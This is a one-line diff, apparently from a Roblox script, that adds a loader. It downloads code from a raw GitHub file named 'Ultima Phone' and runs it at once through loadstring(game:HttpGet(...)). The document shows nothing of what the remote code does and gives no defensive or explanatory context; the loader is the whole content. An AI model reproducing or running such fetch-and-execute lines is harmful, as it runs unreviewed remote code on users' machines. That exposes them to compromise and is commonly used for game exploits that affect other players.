@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTrollMane/ok/master/Ultima%20Phone"))()
